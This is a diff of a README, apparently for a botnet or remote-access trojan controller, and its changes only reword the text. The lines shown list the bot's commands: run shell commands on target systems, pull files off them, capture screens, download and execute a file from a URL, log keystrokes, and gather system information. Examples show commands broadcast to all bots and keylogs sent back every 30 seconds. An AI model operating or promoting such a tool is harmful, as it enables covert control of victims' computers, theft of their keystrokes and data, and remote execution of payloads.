@@ -19,9 +19,9 @@ $b | All bots receive commands
 $wake | Show active bots
 $shell \<cmd\>| Execute a command on target system
 $upload \<file\>| Download a arbitrary file from target system
-$grab | Capture screen from target system
+$grab | Screen capture from target system
 $down_exec \<url\>| Download a file to target system and execute it
-$klogging \<sec\>| Start key logging on target system
+$klogging \<sec\>| Start keystroke logging on target system
 $sysinfo | Get information from target system
 
 <br>
@@ -31,16 +31,16 @@ $sysinfo | Get information from target system
 <br>
 
 
-In the follow code all bots will return stdout from the shell command.
+In the following example all bots will return stdout from the shell command.
 
 <code> $b $shell dir *.png </code>
   
-If want specify just a target you can do this:
+Or if you want to interact with only one specific bot:
 
  <code>$Bot-name $shell dir *.png</code>
 
 ---
-Get the key logger every 30 seconds. The bot will send to you in a .txt format:
+Get the keystroke logger every 30 seconds. The bot will send to you in a .txt format:
 
 <code>$b $klogging 30</code>
 
